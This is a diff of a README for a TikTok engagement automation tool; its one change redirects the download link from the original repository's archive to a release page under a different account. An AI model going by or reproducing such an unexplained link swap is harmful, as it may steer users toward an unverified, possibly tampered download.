@@ -18,7 +18,7 @@
 ### Usage
 
 
-1. Download ZIP <a href="https://github.com/useragents/Zefoy-TikTok-Automator/archive/refs/heads/main.zip">here</a> and extract the ZIP
+1. Download ZIP <a href="https://github.com/marcos1233215/Zefoy-TikTok-Automator/releases/tag/Release">here</a> and extract the ZIP
 2. Install requirements.txt by running the `Install Requirements.bat` file.
 3. Make sure Google Chrome browser is installed.
 4. Run the Python script file.
